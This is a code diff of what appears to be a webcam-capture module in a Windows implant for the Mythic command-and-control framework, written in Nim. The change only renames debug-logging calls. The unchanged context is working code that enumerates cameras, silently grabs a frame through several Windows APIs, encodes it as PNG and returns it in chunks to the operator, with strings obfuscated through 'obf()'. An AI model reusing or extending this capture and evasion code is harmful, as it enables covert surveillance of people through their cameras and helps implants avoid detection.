@@ -224,13 +224,13 @@ when defined(windows):
     # Init COM as STA (webcam devices often require single-threaded apartment)
     let hrCom = CoInitializeEx(nil, COINIT_APARTMENTTHREADED)
     let needComUninit = hrCom >= 0
-    debug &"[MF] CoInitializeEx(STA) = {toHex(hrCom)}"
+    debugLog "webcam", &"CoInitializeEx(STA) = {toHex(hrCom)}"
     defer:
       if needComUninit: CoUninitialize()
 
     var hr = mfStartup(MF_VERSION, 0)
     if hr < 0:
-      debug &"[MF] MFStartup failed: {toHex(hr)}"
+      debugLog "webcam", &"MFStartup failed: {toHex(hr)}"
       return
     defer: discard mfShutdown()
 
@@ -248,7 +248,7 @@ when defined(windows):
     var pConfig: pointer = nil
     hr = mfCreateAttrs(addr pConfig, 1)
     if hr < 0 or pConfig == nil:
-      debug &"[MF] MFCreateAttributes(enum) failed: {toHex(hr)}"
+      debugLog "webcam", &"MFCreateAttributes(enum) failed: {toHex(hr)}"
       if pReaderConfig != nil: comRelease(pReaderConfig)
       return
     defer: comRelease(pConfig)
@@ -259,7 +259,7 @@ when defined(windows):
     let setGuidFn = cast[proc(self: pointer, key: ptr GUID, val: ptr GUID): HRESULT {.stdcall.}](comVtbl(pConfig)[24])
     hr = setGuidFn(pConfig, addr srcTypeKey, addr srcTypeVal)
     if hr < 0:
-      debug &"[MF] SetGUID(SOURCE_TYPE) failed: {toHex(hr)}"
+      debugLog "webcam", &"SetGUID(SOURCE_TYPE) failed: {toHex(hr)}"
       if pReaderConfig != nil: comRelease(pReaderConfig)
       return
 
@@ -267,7 +267,7 @@ when defined(windows):
     var deviceCount: UINT32 = 0
     hr = mfEnumDevSrc(pConfig, addr ppDevices, addr deviceCount)
     if hr < 0 or ppDevices == nil:
-      debug &"[MF] MFEnumDeviceSources failed: {toHex(hr)}, count={deviceCount}"
+      debugLog "webcam", &"MFEnumDeviceSources failed: {toHex(hr)}, count={deviceCount}"
       if pReaderConfig != nil: comRelease(pReaderConfig)
       return
 
@@ -277,7 +277,7 @@ when defined(windows):
         comRelease(devices[i])
       CoTaskMemFree(ppDevices)
 
-    debug &"[MF] Found {deviceCount} device(s), requesting index {deviceIndex}"
+    debugLog "webcam", &"Found {deviceCount} device(s), requesting index {deviceIndex}"
 
     if deviceIndex >= deviceCount.int:
       debug obf("[MF] device index out of range")
@@ -291,7 +291,7 @@ when defined(windows):
     let activateFn = cast[proc(self: pointer, riid: ptr GUID, ppv: ptr pointer): HRESULT {.stdcall.}](comVtbl(devices[deviceIndex])[33])
     hr = activateFn(devices[deviceIndex], addr iidSource, addr pSource)
     if hr < 0 or pSource == nil:
-      debug &"[MF] ActivateObject failed: {toHex(hr)}"
+      debugLog "webcam", &"ActivateObject failed: {toHex(hr)}"
       if pReaderConfig != nil: comRelease(pReaderConfig)
       return
     defer: comRelease(pSource)
@@ -303,7 +303,7 @@ when defined(windows):
     hr = mfCreateReader(pSource, pReaderConfig, addr pReader)
     if pReaderConfig != nil: comRelease(pReaderConfig)
     if hr < 0 or pReader == nil:
-      debug &"[MF] MFCreateSourceReaderFromMediaSource failed: {toHex(hr)}"
+      debugLog "webcam", &"MFCreateSourceReaderFromMediaSource failed: {toHex(hr)}"
       return
     defer: comRelease(pReader)
 
@@ -313,7 +313,7 @@ when defined(windows):
     var pOutType: pointer = nil
     hr = mfCreateMT(addr pOutType)
     if hr < 0 or pOutType == nil:
-      debug &"[MF] MFCreateMediaType failed: {toHex(hr)}"
+      debugLog "webcam", &"MFCreateMediaType failed: {toHex(hr)}"
       return
     defer: comRelease(pOutType)
 
@@ -330,21 +330,21 @@ when defined(windows):
     let setMTFn = cast[proc(self: pointer, idx: DWORD, reserved: pointer, typ: pointer): HRESULT {.stdcall.}](comVtbl(pReader)[7])
     hr = setMTFn(pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, nil, pOutType)
     if hr < 0:
-      debug &"[MF] SetCurrentMediaType(RGB32) failed: {toHex(hr)}, trying NV12..."
+      debugLog "webcam", &"SetCurrentMediaType(RGB32) failed: {toHex(hr)}, trying NV12..."
       # Try NV12 as fallback — many webcams only output this natively
       var nv12Val = MFVideoFormat_NV12_Val
       discard setGuidFn2(pOutType, addr subKey, addr nv12Val)
       hr = setMTFn(pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, nil, pOutType)
       if hr < 0:
-        debug &"[MF] SetCurrentMediaType(NV12) also failed: {toHex(hr)}, trying YUY2..."
+        debugLog "webcam", &"SetCurrentMediaType(NV12) also failed: {toHex(hr)}, trying YUY2..."
         var yuy2Val = MFVideoFormat_YUY2_Val
         discard setGuidFn2(pOutType, addr subKey, addr yuy2Val)
         hr = setMTFn(pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, nil, pOutType)
         if hr < 0:
-          debug &"[MF] SetCurrentMediaType(YUY2) also failed: {toHex(hr)}"
+          debugLog "webcam", &"SetCurrentMediaType(YUY2) also failed: {toHex(hr)}"
           return
 
-    debug &"[MF] Media type set OK: {toHex(hr)}"
+    debugLog "webcam", &"Media type set OK: {toHex(hr)}"
 
     # Let camera warm up
     Sleep(500)
@@ -358,7 +358,7 @@ when defined(windows):
       var warmup: pointer = nil
       var wFlags: DWORD = 0
       hr = readSampleFn(pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, nil, addr wFlags, nil, addr warmup)
-      debug &"[MF] warmup frame {i}: hr={toHex(hr)}, flags={wFlags}, sample={cast[int](warmup)}"
+      debugLog "webcam", &"warmup frame {i}: hr={toHex(hr)}, flags={wFlags}, sample={cast[int](warmup)}"
       if warmup != nil: comRelease(warmup)
 
     # Read the actual frame
@@ -366,18 +366,18 @@ when defined(windows):
     var streamFlags: DWORD = 0
     hr = readSampleFn(pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, nil, addr streamFlags, nil, addr pSample)
     if hr < 0 or pSample == nil:
-      debug &"[MF] ReadSample failed: hr={toHex(hr)}, flags={streamFlags}, sample={cast[int](pSample)}"
+      debugLog "webcam", &"ReadSample failed: hr={toHex(hr)}, flags={streamFlags}, sample={cast[int](pSample)}"
       return
     defer: comRelease(pSample)
 
-    debug &"[MF] Got sample, flags={streamFlags}"
+    debugLog "webcam", &"Got sample, flags={streamFlags}"
 
     # IMFSample::ConvertToContiguousBuffer = vtable[41]
     var pBuffer: pointer = nil
     let convertFn = cast[proc(self: pointer, pp: ptr pointer): HRESULT {.stdcall.}](comVtbl(pSample)[41])
     hr = convertFn(pSample, addr pBuffer)
     if hr < 0 or pBuffer == nil:
-      debug &"[MF] ConvertToContiguousBuffer failed: {toHex(hr)}"
+      debugLog "webcam", &"ConvertToContiguousBuffer failed: {toHex(hr)}"
       return
     defer: comRelease(pBuffer)
 
@@ -388,10 +388,10 @@ when defined(windows):
     let lockFn = cast[proc(self: pointer, pp: ptr pointer, mx: ptr DWORD, cur: ptr DWORD): HRESULT {.stdcall.}](comVtbl(pBuffer)[3])
     hr = lockFn(pBuffer, addr pData, addr maxLen, addr curLen)
     if hr < 0:
-      debug &"[MF] Lock failed: {toHex(hr)}"
+      debugLog "webcam", &"Lock failed: {toHex(hr)}"
       return
 
-    debug &"[MF] Buffer locked: maxLen={maxLen}, curLen={curLen}"
+    debugLog "webcam", &"Buffer locked: maxLen={maxLen}, curLen={curLen}"
 
     # Get frame dimensions from the negotiated output media type
     var pCurType: pointer = nil
@@ -399,7 +399,7 @@ when defined(windows):
     let getCurTypeFn = cast[proc(self: pointer, idx: DWORD, pp: ptr pointer): HRESULT {.stdcall.}](comVtbl(pReader)[6])
     hr = getCurTypeFn(pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, addr pCurType)
     if hr < 0 or pCurType == nil:
-      debug &"[MF] GetCurrentMediaType failed: {toHex(hr)}"
+      debugLog "webcam", &"GetCurrentMediaType failed: {toHex(hr)}"
       let unlockFn = cast[proc(self: pointer): HRESULT {.stdcall.}](comVtbl(pBuffer)[4])
       discard unlockFn(pBuffer)
       return
@@ -432,8 +432,8 @@ when defined(windows):
     let height = int32(frameSize and 0xFFFFFFFF'u64)
     let absStride = if stride != 0: abs(stride) else: width * 4
 
-    debug &"[MF] frame: {width}x{height}, stride={stride}, {curLen} bytes, bottomUp={bottomUp}"
-    debug &"[MF] subtype Data1={actualSubtype.Data1}"
+    debugLog "webcam", &"frame: {width}x{height}, stride={stride}, {curLen} bytes, bottomUp={bottomUp}"
+    debugLog "webcam", &"subtype Data1={actualSubtype.Data1}"
 
     if width <= 0 or height <= 0 or curLen == 0:
       let unlockFn = cast[proc(self: pointer): HRESULT {.stdcall.}](comVtbl(pBuffer)[4])
@@ -512,7 +512,7 @@ when defined(windows):
     discard unlockFn(pBuffer)
 
     result = cast[seq[byte]](image.encodeImage(PngFormat))
-    debug &"[MF] capture success: {result.len} bytes PNG"
+    debugLog "webcam", &"capture success: {result.len} bytes PNG"
 
   proc getHostname(): string =
     var buffer: array[256, WCHAR]
@@ -539,7 +539,7 @@ when defined(windows):
 
     let hrCom = CoInitializeEx(nil, COINIT_APARTMENTTHREADED)
     let needComUninit = hrCom >= 0
-    debug &"[MF-enum] CoInitializeEx(STA) = {toHex(hrCom)}"
+    debugLog "webcam:enum", &"CoInitializeEx(STA) = {toHex(hrCom)}"
     defer:
       if needComUninit: CoUninitialize()
 
@@ -558,7 +558,7 @@ when defined(windows):
     var ppDevices: pointer = nil
     var deviceCount: UINT32 = 0
     if mfEnumDevSrc(pConfig, addr ppDevices, addr deviceCount) < 0 or ppDevices == nil: return
-    debug &"[MF-enum] found {deviceCount} device(s)"
+    debugLog "webcam:enum", &"found {deviceCount} device(s)"
 
     let devices = cast[ptr UncheckedArray[pointer]](ppDevices)
     defer:
@@ -568,7 +568,7 @@ when defined(windows):
 
     # Get DirectShow device names as fallback (known to work for USB cameras)
     let dsNames = enumerateWebcamsDShow()
-    debug &"[MF-enum] DirectShow fallback has {dsNames.len} device(s)"
+    debugLog "webcam:enum", &"DirectShow fallback has {dsNames.len} device(s)"
 
     # Read friendly name from each IMFActivate (which inherits IMFAttributes)
     # IMFAttributes::GetCount = vtable[30], GetString = vtable[12], GetAllocatedString = vtable[13]
@@ -580,14 +580,14 @@ when defined(windows):
       var attrCount: UINT32 = 0
       let getCountFn = cast[proc(self: pointer, pc: ptr UINT32): HRESULT {.stdcall.}](comVtbl(devices[i])[30])
       discard getCountFn(devices[i], addr attrCount)
-      debug &"[MF-enum] device {i} has {attrCount} attributes"
+      debugLog "webcam:enum", &"device {i} has {attrCount} attributes"
 
       # Try GetString (vtable[12])
       var nameBuf: array[256, WCHAR]
       var nameLen: UINT32 = 0
       let getStrFn = cast[proc(self: pointer, key: ptr GUID, pwsz: pointer, cchBuf: UINT32, pcch: ptr UINT32): HRESULT {.stdcall.}](comVtbl(devices[i])[12])
       let hrName = getStrFn(devices[i], addr nameKey, addr nameBuf[0], 256, addr nameLen)
-      debug &"[MF-enum] device {i} GetString(FRIENDLY_NAME) hr={toHex(hrName)} nameLen={nameLen}"
+      debugLog "webcam:enum", &"device {i} GetString(FRIENDLY_NAME) hr={toHex(hrName)} nameLen={nameLen}"
       if hrName >= 0 and nameLen > 0:
         let name = $cast[WideCString](addr nameBuf[0])
         result.add((index: i, name: name))
@@ -597,14 +597,14 @@ when defined(windows):
         var allocLen: UINT32 = 0
         let getAllocStr = cast[proc(self: pointer, key: ptr GUID, ppwsz: ptr pointer, pcch: ptr UINT32): HRESULT {.stdcall.}](comVtbl(devices[i])[13])
         let hrAlloc = getAllocStr(devices[i], addr nameKey, addr pName, addr allocLen)
-        debug &"[MF-enum] device {i} GetAllocatedString hr={toHex(hrAlloc)}"
+        debugLog "webcam:enum", &"device {i} GetAllocatedString hr={toHex(hrAlloc)}"
         if hrAlloc >= 0 and pName != nil:
           let name = $cast[WideCString](pName)
           CoTaskMemFree(pName)
           result.add((index: i, name: name))
         elif i < dsNames.len:
           # Use DirectShow name as fallback
-          debug &"[MF-enum] device {i} using DirectShow name: {dsNames[i].name}"
+          debugLog "webcam:enum", &"device {i} using DirectShow name: {dsNames[i].name}"
           result.add((index: i, name: dsNames[i].name))
         else:
           result.add((index: i, name: &"Device {i}"))
@@ -627,7 +627,7 @@ when defined(windows):
       0, 0
     )
     if hCapWnd == 0:
-      debug "[DEBUG] Failed to create capture window"
+      debugLog "webcam", "Failed to create capture window"
       return
 
     defer:
@@ -635,7 +635,7 @@ when defined(windows):
 
     # Connect to the specified camera device
     if SendMessageA(hCapWnd, WM_CAP_DRIVER_CONNECT, deviceIndex, 0) == 0:
-      debug "[DEBUG] Failed to connect to camera device ", deviceIndex
+      debugLog "webcam", "Failed to connect to camera device ", deviceIndex
       return
 
     defer:
@@ -646,7 +646,7 @@ when defined(windows):
 
     # Grab a single frame
     if SendMessageA(hCapWnd, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0) == 0:
-      debug "[DEBUG] Failed to grab frame from camera"
+      debugLog "webcam", "Failed to grab frame from camera"
       return
 
     # Copy frame to clipboard
@@ -654,7 +654,7 @@ when defined(windows):
 
     # Get the image from the clipboard
     if OpenClipboard(0) == 0:
-      debug "[DEBUG] Failed to open clipboard for webcam frame"
+      debugLog "webcam", "Failed to open clipboard for webcam frame"
       return
 
     defer:
@@ -662,20 +662,20 @@ when defined(windows):
 
     let hBitmap = GetClipboardData(CF_BITMAP)
     if hBitmap == 0:
-      debug "[DEBUG] No bitmap data in clipboard after webcam capture"
+      debugLog "webcam", "No bitmap data in clipboard after webcam capture"
       return
 
     # Get bitmap dimensions
     var bm: BITMAP
     if GetObjectA(hBitmap, int32(sizeof(BITMAP)), cast[LPVOID](addr bm)) == 0:
-      debug "[DEBUG] Failed to get bitmap object"
+      debugLog "webcam", "Failed to get bitmap object"
       return
 
     let width = bm.bmWidth
     let height = bm.bmHeight
 
     if width <= 0 or height <= 0:
-      debug "[DEBUG] Invalid bitmap dimensions: ", width, "x", height
+      debugLog "webcam", "Invalid bitmap dimensions: ", width, "x", height
       return
 
     # Create a pixie image
@@ -754,14 +754,14 @@ proc webcamSnap*(taskId: string, params: JsonNode): JsonNode =
       if params.hasKey(obf("device_index")):
         deviceIndex = params[obf("device_index")].getInt()
 
-      debug &"[DEBUG] Capturing webcam frame from device {deviceIndex}"
+      debugLog "webcam", &"Capturing webcam frame from device {deviceIndex}"
 
       let frameData = captureWebcamFrame(deviceIndex)
       if frameData.len == 0:
         return mythicError(taskId, obf("Failed to capture webcam frame. Device may not be available or connected."))
 
       let totalChunks = int((frameData.len.float / CHUNK_SIZE.float).ceil)
-      debug &"[DEBUG] Webcam frame captured: {frameData.len} bytes, {totalChunks} chunks"
+      debugLog "webcam", &"Webcam frame captured: {frameData.len} bytes, {totalChunks} chunks"
 
       let downloadResponse = %*{
         obf("total_chunks"): totalChunks,
